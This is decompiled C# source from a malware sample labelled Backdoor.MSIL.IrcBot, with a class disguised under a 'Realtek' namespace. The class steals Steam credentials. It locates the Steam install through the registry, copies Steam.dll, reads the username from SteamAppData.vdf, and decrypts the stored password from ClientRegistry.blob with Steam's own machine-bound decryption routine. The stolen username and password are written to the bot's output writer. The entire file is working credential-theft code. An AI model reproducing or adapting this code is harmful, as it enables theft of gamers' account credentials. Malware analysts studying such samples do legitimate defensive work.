// Decompiled with JetBrains decompiler
// Type: Realtek.Steam
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Realtek
{
  internal sealed class Steam
  {
    [DllImport("Steam.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern int SteamDecryptDataForThisMachine(
      string encryptedData,
      int encryptedDataSize,
      StringBuilder decryptedBuffer,
      int decryptedBufferSize,
      ref int decryptedDataSize);

    public static void Start()
    {
      try
      {
        string str1 = (string) Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam", true).GetValue("SteamPath");
        if (!File.Exists(Environment.CurrentDirectory + "\\Steam.dll"))
          File.Copy(str1 + "\\Steam.dll", Environment.CurrentDirectory + "\\Steam.dll", true);
        bool flag = false;
        string[] strArray1 = File.ReadAllLines(str1 + "\\config\\SteamAppData.vdf");
        for (int index = 0; index < strArray1.Length && !flag; ++index)
        {
          if (strArray1[index].Contains("User"))
          {
            string[] strArray2 = Regex.Replace(strArray1[index], "\\s+", " ").Split(' ');
            if (strArray2[2] != null)
            {
              string str2 = strArray2[2].TrimEnd('"').TrimStart('"');
              Program.Writer.WriteLine(Program.MessageGreen + "Username : " + str2);
            }
          }
        }
        string str3 = File.ReadAllText(str1 + "\\ClientRegistry.blob");
        int num = str3.IndexOf("Phrase", 1);
        string encryptedData = Steam.Left(Steam.Mid(str3, num + 40), 92).Trim();
        int decryptedDataSize = 0;
        StringBuilder decryptedBuffer = new StringBuilder();
        decryptedBuffer.Length = encryptedData.Length / 2;
        if (Steam.SteamDecryptDataForThisMachine(encryptedData, encryptedData.Length, decryptedBuffer, decryptedBuffer.Length, ref decryptedDataSize) == 0)
          Program.Writer.WriteLine(Program.MessageGreen + "Password : " + (object) decryptedBuffer);
        else
          Program.Writer.WriteLine(Program.MessageRed + "Error decrypting the Steam Password.");
        Console.ReadLine();
      }
      catch
      {
        try
        {
          string str4 = "@C:\\Program Files\\Steam";
          File.Copy(str4 + "\\Steam.dll", Environment.CurrentDirectory + "\\Steam.dll", true);
          bool flag = false;
          string[] strArray3 = File.ReadAllLines(str4 + "\\config\\SteamAppData.vdf");
          for (int index = 0; index < strArray3.Length && !flag; ++index)
          {
            if (strArray3[index].Contains("User"))
            {
              string[] strArray4 = Regex.Replace(strArray3[index], "\\s+", " ").Split(' ');
              if (strArray4[2] != null)
              {
                string str5 = strArray4[2].TrimEnd('"').TrimStart('"');
                Program.Writer.WriteLine(Program.MessageGreen + "Username : " + str5);
              }
            }
          }
          string str6 = File.ReadAllText(str4 + "\\ClientRegistry.blob");
          int num = str6.IndexOf("Phrase", 1);
          string encryptedData = Steam.Left(Steam.Mid(str6, num + 40), 92).Trim();
          int decryptedDataSize = 0;
          StringBuilder decryptedBuffer = new StringBuilder();
          decryptedBuffer.Length = encryptedData.Length / 2;
          if (Steam.SteamDecryptDataForThisMachine(encryptedData, encryptedData.Length, decryptedBuffer, decryptedBuffer.Length, ref decryptedDataSize) == 0)
            Program.Writer.WriteLine(Program.MessageGreen + "Password : " + (object) decryptedBuffer);
          else
            Program.Writer.WriteLine(Program.MessageRed + "error : Error decrypting the Steam Password.");
          Console.ReadLine();
        }
        catch
        {
        }
      }
    }

    public static string Left(string param, int length) => param.Substring(0, length);

    public static string Mid(string param, int startIndex) => param.Substring(startIndex);
  }
}
